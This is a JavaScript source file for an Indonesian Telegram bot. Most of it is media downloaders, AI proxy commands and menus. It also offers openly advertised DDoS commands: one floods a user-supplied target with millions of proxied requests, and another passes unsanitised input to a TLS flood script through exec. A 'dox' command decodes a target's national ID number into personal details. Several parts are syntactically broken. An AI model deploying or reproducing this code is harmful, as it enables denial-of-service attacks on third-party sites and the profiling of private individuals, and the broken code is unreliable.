/*
     Recode By Alfi
     Original Script By Rafael
     Base by Zeeone
     thanks to wannoffc
*/
require("./settings")
const {
    Telegraf,
    Context,
    Markup
} = require('telegraf')
const {
    message,
    editedMessage,
    channelPost,
    editedChannelPost,
    callbackQuery
} = require("telegraf/filters");
const {toFirstCase,
        isNumber,
        formatp,
        parseMention, 
        resize, 
        getRandom,
        generateProfilePicture, 
        getCase, 
        runtime, 
        FileSize, 
        h2k, 
        makeid, 
        kyun, 
        randomNomor, 
        jsonformat, 
        isUrl,
        fetchJson, 
        sleep,
        getBuffer
        } = require("./lib/myfunc2");
        const { formatSize } = require("./lib/myfunc3");
const chalk = require('chalk')
const fs = require('fs')
const fetch = require('node-fetch')
const os = require('os')
const speed = require('performance-now')
const util = require('util')
const yts = require('yt-search')
const axios = require('axios');
const {
    simple
} = require('./lib/myfunc')
const { pinterest } = require("./lib/pinterest")

const hxz = require ("hxz-api")

module.exports = alfixd = async (alfixd, bot) => {
    //console.log(alfixd)
    try {
        const body = alfixd.message.text || alfixd.message.caption || ''
        const budy = (typeof alfixd.message.text == 'string' ? alfixd.message.text : '')
        const {
            isUrl
        } = simple
        const isCmd = /^[°•π÷×¶∆£¢€¥®™�✓_=|~!?#/$%^&.+-,\\\©^]/.test(body)        
        const args = body.trim().split(/ +/).slice(1)
        const text = q = args.join(" ")
        const user = simple.getUserName(alfixd.message.from)
        const pushname = user.full_name;
        const user_id = alfixd.message.from.id + " "
        const username = alfixd.message.from.username ? alfixd.message.from.username : "alfisyahrial";
        const isCreator = OWNER[0].replace("https://t.me/", '') == alfixd.update.message.from.username
        const from = alfixd.message.chat.id
const prefix = isCmd ? body[0] : ''
        const command = isCreator ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : isCmd ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : '';
        const isGroup = alfixd.chat.type.includes('group')
        const groupName = isGroup ? alfixd.chat.title : ''

        const isImage = alfixd.message.hasOwnProperty('photo')
        const isVideo = alfixd.message.hasOwnProperty('video')
        const isAudio = alfixd.message.hasOwnProperty('audio')
        const isSticker = alfixd.message.hasOwnProperty('sticker')
        const isContact = alfixd.message.hasOwnProperty('contact')
        const isLocation = alfixd.message.hasOwnProperty('location')
        const isDocument = alfixd.message.hasOwnProperty('document')
        const isAnimation = alfixd.message.hasOwnProperty('animation')
        const isMedia = isImage || isVideo || isAudio || isSticker || isContact || isLocation || isDocument || isAnimation
        const quotedMessage = alfixd.message.reply_to_message || {}
        const isQuotedImage = quotedMessage.hasOwnProperty('photo')
        const isQuotedVideo = quotedMessage.hasOwnProperty('video')
        const isQuotedAudio = quotedMessage.hasOwnProperty('audio')
        const isQuotedSticker = quotedMessage.hasOwnProperty('sticker')
        const isQuotedContact = quotedMessage.hasOwnProperty('contact')
        const isQuotedLocation = quotedMessage.hasOwnProperty('location')
        const isQuotedDocument = quotedMessage.hasOwnProperty('document')
        const isQuotedAnimation = quotedMessage.hasOwnProperty('animation')
        const isQuoted = alfixd.message.hasOwnProperty('reply_to_message')
        const timestampi = speed();
        const latensii = speed() - timestampi

        const reply = async (text) => {
            for (var x of simple.range(0, text.length, 4096)) { //maks 4096 character, jika lebih akan eror
                return await alfixd.replyWithMarkdown(text.substr(x, 4096), {
                    disable_web_page_preview: true
                })
            }
        }
        const getStyle = (style_, style, style2) => {
            listt = `${lang.getStyle(style, style2)}`
            for (var i = 0; i < 300; i++) {
                listt += '» `' + style_[i] + '`\n'
            }
            reply(listt)
        }

        //get type message 
        var typeMessage = body.substr(0, 50).replace(/\n/g, '')
        if (isImage) typeMessage = 'Image'
        else if (isVideo) typeMessage = 'Video'
        else if (isAudio) typeMessage = 'Audio'
        else if (isSticker) typeMessage = 'Sticker'
        else if (isContact) typeMessage = 'Contact'
        else if (isLocation) typeMessage = 'Location'
        else if (isDocument) typeMessage = 'Document'
        else if (isAnimation) typeMessage = 'Animation'

        //push message to console
        if (alfixd.message) {
            console.log(chalk.black(chalk.bgWhite('[ CMD ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(body || typeMessage)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname) + '\n' + chalk.blueBright('=> In'), chalk.green(isGroup ? groupName : 'Private Chat', alfixd.message.chat.id))
        }
        
        
        
        
 const sendMessage = (chatId, text) => bot.sendMessage(chatId, text);
function generateRandomPassword() {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
  const length = 10;
  let password = '';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    password += characters[randomIndex];
  }
  return password;
}       
   
const formats = ["audio", "video"];
const audioQuality = [320, 256, 192, 128, 64];
const videoQuality = ["360p", "480p", "720p", "1080p"];

const bigconv = {
 getToken: async (url) => {
 const extractVideoId = (url) => {
 const regex = /(?:https?:\/\/)?(?:www\.)?(?:youtube\.com\/watch\?v=|youtu\.be\/)([a-zA-Z0-9_-]{11})/;
 const match = url.match(regex);
 return match ? match[1] : null;
 };

 const id = extractVideoId(url);
 if (!id) {
 throw new Error('ID videonya gk ketemu jir, pastikan link youtube yak');
 }

 const config = {
 method: 'GET',
 url: `https://dd-n01.yt2api.com/api/v4/info/${id}`,
 headers: {
 'User-Agent': 'Mozilla/5.0 (Android 10; Mobile; rv:131.0) Gecko/131.0 Firefox/131.0',
 'Accept': 'application/json',
 'accept-language': 'id-ID',
 'referer': 'https://bigconv.com/',
 'origin': 'https://bigconv.com',
 'alt-used': 'dd-n01.yt2api.com',
 'sec-fetch-dest': 'empty',
 'sec-fetch-mode': 'cors',
 'sec-fetch-site': 'cross-site',
 'priority': 'u=0',
 'te': 'trailers'
 }
 };

 const response = await axios.request(config);
 const cookies = response.headers['set-cookie'];
 const processedCookie = cookies ? cookies[0].split(';')[0] : '';
 const authorization = response.headers['authorization'] || '';
 const result = { data: response.data, cookie: processedCookie, authorization };
 return result;
 },
 convert: async (url, format, quality) => {
 const data = await bigconv.getToken(url);
 const formats = data.data.formats;

 let token;
 if (format === "audio") {
 const audioOptions = formats.audio.mp3;
 const selectedAudio = audioOptions.find(option => option.quality === quality);
 if (selectedAudio) {
 token = selectedAudio.token;
 } else {
 throw new Error(`Kualitas audio ${quality} tidak tersedia.`);
 }
 } else if (format === "video") {
 const videoOptions = formats.video.mp4;
 const selectedVideo = videoOptions.find(option => option.quality === quality);
 if (selectedVideo) {
 token = selectedVideo.token;
 } else {
 throw new Error(`Kualitas video ${quality} tidak tersedia.`);
 }
 } else {
 throw new Error('Format tidak dikenali. Gunakan "audio" atau "video".');
 }

 const raw = JSON.stringify({ "token": token });

 const config = {
 method: 'POST',
 url: 'https://dd-n01.yt2api.com/api/v4/convert',
 headers: {
 'User-Agent': 'Mozilla/5.0 (Android 10; Mobile; rv:131.0) Gecko/131.0 Firefox/131.0',
 'Accept': 'application/json',
 'Content-Type': 'application/json',
 'accept-language': 'id-ID',
 'referer': 'https://bigconv.com/',
 'origin': 'https://bigconv.com',
 'sec-fetch-dest': 'empty',
 'sec-fetch-mode': 'cors',
 'sec-fetch-site': 'cross-site',
 'priority': 'u=0',
 'te': 'trailers',
 'Cookie': data.cookie,
 'authorization': data.authorization
 },
 data: raw
 };

 const response = await axios.request(config);
 return { jobId: response.data.id, cookie: data.cookie, authorization: data.authorization };
 },
 download: async (url, format, quality) => {
 const { jobId, cookie, authorization } = await bigconv.convert(url, format, quality);
 return new Promise((resolve, reject) => {
 const checkStatus = async () => {
 const config = {
 method: 'GET',
 url: `https://dd-n01.yt2api.com/api/v4/status/${jobId}`,
 headers: {
 'User-Agent': 'Mozilla/5.0 (Android 10; Mobile; rv:131.0) Gecko/131.0 Firefox/131.0',
 'Accept': 'application/json',
 'accept-language': 'id-ID',
 'referer': 'https://bigconv.com/',
 'origin': 'https://bigconv.com',
 'sec-fetch-dest': 'empty',
 'sec-fetch-mode': 'cors',
 'sec-fetch-site': 'cross-site',
 'priority': 'u=4',
 'te': 'trailers',
 'Cookie': cookie,
 'authorization': authorization
 }
 };

 const response = await axios.request(config);
 console.log(response.data);
 if (response.data.status === 'completed') {
 clearInterval(interval);
 resolve(response.data);
 } else if (response.data.status === 'failed') {
 clearInterval(interval);
 resolve(response.data);
 } else {
 console.log('Status belum complete, wet iam cek lagi...');
 }
 };

 const interval = setInterval(checkStatus, 5000);
 });
 }
};
                  
                       
                            
                                 
                                      
                                           
                                                
                                                     
                                                               
        
        switch (command) {
case "ddos":
  {
      if (!text) return reply('_send domain target_')
        const SocksProxyAgent = require('socks-proxy-agent');
          const HttpsProxyAgent = require('https-proxy-agent');
            const userIP = 'myserver2.junn4.my.id'; // masukkan link panel tanpa https://
              const targetUrl = text; // Ganti dengan URL tujuan yang sesuai
                const proxyListFile = 'lib/proxy.txt'; // Nama file yang berisi daftar proxy
                  const totalRequests = 5000000;
                     const delay = 100;
                  function readProxyList() {
                try {
              const data = fs.readFileSync(proxyListFile, 'utf8');
            const lines = data.trim().split('\n');
          return lines.map(line => line.trim());
        } catch (error) {
      console.error(`Gagal membaca daftar proxy: ${error}`);
    return [];
  }
}

  function sendRequest(target, agent, userIP) {
    if (allowedIPs.includes(userIP)) {
      axios.get(target, { httpAgent: agent }) // Menggunakan httpAgent untuk proxy SOCKS
         .then((response) => {
       
        // Lakukan sesuatu dengan respons
        }
          )
             .catch((error) => {
        
        // Tangani kesalahan
                }
                    );
                } 
             else 
          {
        console.error(`IP Mu Tidak Terdaftar`);
      }
    }
  function sendRequests() {
     const proxyList = readProxyList();
       let currentIndex = 0;
         function sendRequestUsingNextProxy() {
             if (currentIndex < proxyList.length) {
                const proxyUrl = proxyList[currentIndex];
                    let agent;
                        if (proxyUrl.startsWith('socks4') || proxyUrl.startsWith('socks5')) {
                             agent = new SocksProxyAgent(proxyUrl);
                                 } 
                                   else if (proxyUrl.startsWith('https')) 
                                 {
                             agent = new HttpsProxyAgent({ protocol: 'http', ...parseProxyUrl(proxyUrl) }); // Menggunakan HttpsProxyAgent dengan protocol 'http'
                        }

                    sendRequest(targetUrl, agent, userIP);
                 currentIndex++;
                setTimeout(sendRequestUsingNextProxy, 0);
             } 
         else 
       {
     setTimeout(sendRequests, delay);
  }
    }
       sendRequestUsingNextProxy();
            }
                 const allowedIPs = ['myserver2.junn4.my.id'];
// Mendapatkan alamat IP pengguna
            sendRequests();
      reply('_menyerang_...')
    }
  break
case 'runtime':{
    alfixd.deleteMessage().catch(() => {});
      reply(`Fiibotz Online ${runtime(process.uptime())}`)
    }
  break  

case 'play': {
if (!text) return m.reply('What Song Are You Looking For?')
try {
const search = await yts(text)
const convert = search.all[0]

if (!convert || convert === 0) {
 m.reply('The Song You Searched For Was Found')
}

        await reply('Sabar... sedang mencari!');
        
        // Mendapatkan data audio dari API
        let Lepikk = await bigconv.download(convert.url,"video","360p")

        // Mengirim audio beserta informasi detailnya
        let infoLagu = `🎵 *Nama:* ${convert.title}\n📀 *Artis:* ${convert.author.name}\n⏱️ *Durasi:* ${convert.timestamp}\n👁️ *Dilihat:* ${convert.views}\n🔗 *Tautan:* ${convert.url}`;
        await alfixd.replyWithAudio({ 
                url: Lepikk.download,                        mimetype: 'audio/mp4', 
            ptt: false 
        } , {
  caption: infoLagu
     })
    } catch (error) {
        console.error(error);
        reply('Terjadi kesalahan saat memproses permintaan.');
        }
    }           
break;

case 'bypas':{
    if(!isCreator) return reply('[!] Developer Feature')
     if (!q.includes(' ')) return reply('*Example* example.com [time] [rps] [threads]')
     mm = args.join(' ')
     m1 = mm.split(" ")[0];
     m2 = mm.split(" ")[1]; 
     m3 = mm.split(" ")[2];
     m4 = mm.split(" ")[3];
     const url = m1;
     const time = m2;
     const rps = m3;
     const threads = m4;
     const proxyListFile = 'lib/proxy.txt'
     exec(`node lib/tls-arz.js ${url} ${time} ${rps} ${threads} ${proxyListFile}`, (error, stdout, stderr) => {
     if (error) {
          reply(`eror: ${Error}`);
          return;
        }
        if (stderr) {
          reply(`${stderr}`);
          return;
        }
        reply(`${stdout}`);
      });
      console.log(`${proxyListFile}`)
      reply(`*Attack Server*\n*• Method* : main.py\n*• Target* : ${m1}\n*• Time* : ${m2}\n*• Rps* : ${m3}\n*• Thread* : ${m4}\n*• Proxy* : proxy.txt\n\n`)
    }
  break
  case 'pinterest':
case 'pin':
    if (!text) {
        return reply('Contoh penggunaan:\n' + command + ' Violet Evergarden');
    }
    
    reply('Tunggu sebentar...');
    
    try {
        // Mendapatkan data dari API Pinterest
        const { data } = await axios.get(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${encodeURIComponent(text)}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${encodeURIComponent(text)}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
        
        // Memetakan URL gambar
        let results = data.resource_response.data.results.map(v => v.images.orig.url);
        
        // Memilih gambar secara acak
        if (results.length > 0) {
            let selectedImage = results[Math.floor(Math.random() * results.length)];
            
            // Mengirim gambar
            await alfixd.replyWithPhoto(
                { url: selectedImage },
                { caption: 'DONE' }
            );
        } else {
            reply('Maaf, tidak ada hasil ditemukan.');
        }
    } catch (error) {
        console.error(error);
        reply('Terjadi kesalahan saat mengambil data. Silakan coba lagi nanti.');
    }
    break;
  case 'listcase': {
let { listCase } = require('./lib/scrapelistCase.js')
reply(listCase())
}
break
  
//Ai
case 'ai': {
                if (!text) return reply('What is your question?')
                const data1 = await fetchJson(`https://btch.us.kg/gptgo?text=${encodeURIComponent(text)}`)
    const msgai = data1.result;
reply(`${msgai}`)
           }
            break             
case 'gemini': {
                if (!text) return reply('What is your question?')
                const gemini = await fetchJson(`https://btch.us.kg/gpt3?text=${encodeURIComponent(text)}`)
    const msgai = gemini.result;
reply(`${msgai}`)
           }
//=========================================\\======
case 'blackboxai': {
                if (!text) return reply('What is your question?')
                let d = await fetchJson(`https://itzpire.com/ai/blackbox-ai?q=${encodeURIComponent(text)}`)
                const alfixd = d.result
                reply(alfixd)
           }
            break
case "ssweb": {
if (!q) return reply("[!] sertakan link")
reply("[!] Mohon Tunggu Sedang Proses")
  try { 
  let anu = `https://api.vreden.my.id/api/ssweb?url=${encodeURIComponent(text)}&type=desktop`
  alfixd.replyWithPhoto({
        url: anu
    }, {
  caption: 'DONE SS WEB'
     })
	} catch {
	  reply('yah Error kak laporankan ke owner agar di perbaiki')
	}
}
break
case 'text2image':
case 'text2img': {
if (!q) return reply('mana promt nya Kak')
reply("mohon tunggu sebentar")
	try {
	let anu = `https://api.vreden.my.id/api/text2img?query=${encodeURIComponent(text)}`	
	alfixd.replyWithPhoto({
        url: anu
    }, {
  caption: 'DONE'
     })
	} catch {
	  reply('yah Error kak laporankan ke owner agar di perbaiki')
	}
}
break
case 'dalle': {
  if (!text) return reply(`*This command generates images from text prompts*\n\n*𝙴xample usage*\n*${prefix + command} Beautiful anime girl*\n*${prefix + command} girl in pink dress*`)
  	try {
	let nanod = `https://btch.us.kg/ai/text2img?text=${encodeURIComponent(text)}`
	alfixd.replyWithPhoto({
        url: nanod
    }, {
  caption: 'DONE'
     })	
	} catch {
	  reply('yah Error kak laporankan ke owner agar di perbaiki')
	}
  }
  break
  
  case 'lirik': {
    if (!text) return reply('[!] Masukkan judul lagu');
    const hasil = await fetchJson(`https://btch.us.kg/lirik?text=${encodeURIComponent(text)}`)
    const thumb = hasil.result.image
const lirikk = `
*Title :* ${hasil.result.title}
*Artis :* ${hasil.result.artist}
*Url :* ${hasil.result.url}


`
    await alfixd.replyWithPhoto({
    url: thumb,
  }, {
     caption: `${lirikk}`
        }
        )
reply(`*Lyrics :* ${hasil.result.lyrics}`)        
}
break;

case 'facebook':
  case 'fb':{
     if (!text) return reply('[!] link..!')
        alfixd.deleteMessage().catch(() => {});
            reply('[!] Wait Result...')
  const data = await fetchJson(`https://btch.us.kg/download/fbdl?url=${encodeURIComponent(text)}`)
                const videoBuffer = data.result.Normal_video;           
        await alfixd.replyWithVideo({
    url: videoBuffer,
  }, {
     caption: `DONE`
        }
        )
     }
  break
  case 'ig': 
  case 'instagram':{
    if (!text) return reply('[!] link...!')
            reply('[!] Wait Result...')
                const data = await fetchJson(`https://btch.us.kg/download/igdl?url=${encodeURIComponent(text)}`);
    if (data && data.result && data.result.length > 0 && data.result[0].url) {
        const hasil = data.result[0].url;
                    await alfixd.replyWithVideo({
                url: hasil,
                   }, {
                caption: `[ INSTAGRAM DOWNLOAD V1 ]
    SCRIPT BY: FIIBOTZ            `
            }
        )
    }
    }
  break


case 'tiktok': {
if (!text) return reply('[!] link...!')
            reply('[!] Wait Result...')
   let anu = await fetchJson(`https://api.tiklydown.eu.org/api/download?url=${encodeURIComponent(text)}`)   
   const vidnya = anu.video.noWatermark
   await alfixd.replyWithVideo({
                url: vidnya,
                   }, {
                caption: `[ TIKTOK DOWNLOAD V1 ]
   Caption: ${anu.title}
   Likes: ${anu.stats.likeCount}
   Comment: ${anu.stats.commentCount}    Share: ${anu.stats.shareCount}
   Views: ${anu.stats.playCount}
   
SCRIPT BY FIIBOTZ`
            }
        )
    }
  break 
        

case 'yt': case 'youtube': case 'ytv': {
  if (!text) return reply(' [ Example ] :*\n> *.yt <link youtube>*')
  reply('waiting in progress'...)
try {
  reply('*Process of sending video, may take 1-3 minutes if the video duration is too long!*')
  let proces = await (await fetch(`https://btch.us.kg/download/ytdl?url=${text}`)).json()
  let video4 = proces.result.mp4;
  await alfixd.replyWithVideo({
                url: video4,
                   }, {
                caption: `[ YOUTUBE DOWNLOAD ]
                *title* ${proces.result.title}
SCRIPT BY FIIBOTZ`
            }
        )
    }
  break 
  
case 'listram': case 'ramlist':
alfixd.deleteMessage().catch(() => {});
let menuh = 
`*Hi @${pushname} 👋*
    
▭▬▭( 𝐑𝐀𝐌 𝐘𝐀𝐍𝐆 𝐓𝐄𝐑𝐒𝐄𝐃𝐈𝐀 )▭▬▭
• 1GB ( PREMIUM ) ✅
• 2GB ( PREMIUM ) ✅
• 3GB ( PREMIUM ) ✅
• 4GB ( PREMIUM ) ✅
• 5GB ( PREMIUM ) ✅
• 6GB ( PREMIUM ) ✅
• 7GB ( PREMIUM ) ✅
• 8GB ( PREMIUM ) ✅
• UNLI ( PREMIUM ) ✅
▭▬▭▬▭▬▭▬▭▬▭▬▭▬`
alfixd.replyWithPhoto(
        global.pp, {
            caption: menuh,
    reply_markup: {
      keyboard: [
        [{ text: 'next' }]
      ],
      one_time_keyboard: true,
      resize_keyboard: true 
    }
        })
break            
case 'nikparser': case 'dox':
if (!isCreator) return reply("khusus alfixd")
if (!q) return reply(`</> Anda harus mendapatkan nik target terlebih dahulu dan lakukan command seperti ini : ${prefix + command} 16070xxxxx\n\n`)
const { nikParser } = require('nik-parser')
const ktp = q
const nik = nikParser(ktp)
reply(`Nik: ${nik.isValid()}\nProvinsi ID: ${nik.provinceId()}\nNama Provinsi: ${nik.province()}\nKabupaten ID: ${nik.kabupatenKotaId()}\nNama Kabupaten: ${nik.kabupatenKota()}\nKecamatan ID: ${nik.kecamatanId()}\nNama Kecamatan: ${nik.kecamatan()}\nKode Pos: ${nik.kodepos()}\nJenis Kelamin: ${nik.kelamin()}\nTanggal Lahir: ${nik.lahir()}\nUniqcode: ${nik.uniqcode()}`)
break

case "menudownload": {
let wkwkw = `▧ Download Menu
│ • ${prefix}tiktok
│ • ${prefix}instagram
│ • ${prefix}facebook
│ • ${prefix}play
│ • ${prefix}pinterest 
│ • ${prefix}youtube
└───···`
alfixd.replyWithPhoto(
        global.pp, {
            caption: wkwkw,
    reply_markup: {
      keyboard: [
        [{ text: 'next' }]
      ],
      one_time_keyboard: true,
      resize_keyboard: true 
    }
        })
}
break
case "menuai": {
let wkwk = `▧  Ai Menu
│ • ${prefix}ai
│ • ${prefix}gemini
│ • ${prefix}blackboxai
└───···`
alfixd.replyWithPhoto(
        global.pp, {
            caption: wkwk,
    reply_markup: {
      keyboard: [
        [{ text: 'next' }]
      ],
      one_time_keyboard: true,
      resize_keyboard: true 
    }
        })
}
break
case "menuimage": {
let yahaha = `▧ ImageCreate Menu
│ • ${prefix}txt2img
│ • ${prefix}dalle
└───···`
alfixd.replyWithPhoto(
        global.pp, {
            caption: yahaha,
    reply_markup: {
      keyboard: [
        [{ text: 'next' }]
      ],
      one_time_keyboard: true,
      resize_keyboard: true 
    }
        })
}
break
case "menuddos": {
let komtol = `▧ DDoS Menu
│ • ${prefix}ddos
│ • ${prefix}dos
│ • ${prefix}mix
│ • ${prefix}bypass
└───···`
alfixd.replyWithPhoto(
        global.pp, {
            caption: komtol,
    reply_markup: {
      keyboard: [
        [{ text: 'next' }]
      ],
      one_time_keyboard: true,
      resize_keyboard: true 
    }
        })
}
break
case "menucpanel": {
let ngen = `▧ CreatePanel Menu
│ • ${prefix}1gb
│ • ${prefix}2gb
│ • ${prefix}3gb
│ • ${prefix}4gb
│ • ${prefix}5gb
│ • ${prefix}6gb
│ • ${prefix}7gb
│ • ${prefix}8gb
│ • ${prefix}unli
│ • ${prefix}listsrv
│ • ${prefix}listadmin
│ • ${prefix}createadmin
│ • ${prefix}cekid
└───···`
alfixd.replyWithPhoto(
        global.pp, {
            caption: ngen,
    reply_markup: {
      keyboard: [
        [{ text: 'next' }]
      ],
      one_time_keyboard: true,
      resize_keyboard: true 
    }
        })
}
break
case "menuinstallpanel": {
let ngentod = `▧ InstallPanel Menu
│ • ${prefix}installpanel
│ • ${prefix}installwings
└───···`
alfixd.replyWithPhoto(
        global.pp, {
            caption: ngentod,
    reply_markup: {
      keyboard: [
        [{ text: 'next' }]
      ],
      one_time_keyboard: true,
      resize_keyboard: true 
    }
        })
}
break
case 'menu': case 'back!':
const totalMem = os.totalmem();
const freeMem = os.freemem();
const usedMem = totalMem - freeMem;
const formattedUsedMem = formatSize(usedMem);
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const formattedTotalMem = formatSize(totalMem);
let poke = 
`Hi 👋 ${pushname} saya adalah assisten bot yang di buat oleh AlfiXD, Jika menemukan Error Silahkan Report ke owner

▧  Info Bot
│ • BotName: ${BOT_NAME}
│ • OwnerName: ${OWNER_NAME}
│ • Info : Case
│ • Library : telegraf
│ • RAM : ${formattedUsedMem} / ${formattedTotalMem}
│ • Date : ${new Date().toLocaleString()}
└───···
▧ List Menu
│ • /menuai
│ • /menudownload
│ • /menuimage
│ • /menuddos
│ • /menucpanel
└───···

Original Script || By Fiibotz`
alfixd.replyWithPhoto(
        global.pp, {
            caption: poke,
    reply_markup: {
      keyboard: [
        [{ text: 'next' }]
      ],
      one_time_keyboard: true,
      resize_keyboard: true 
    }
        })
break  

            default:
        }
    } catch (e) {
        alfixd.reply(util.format(e))
        console.log('[ ERROR ] ' + e)
    }
}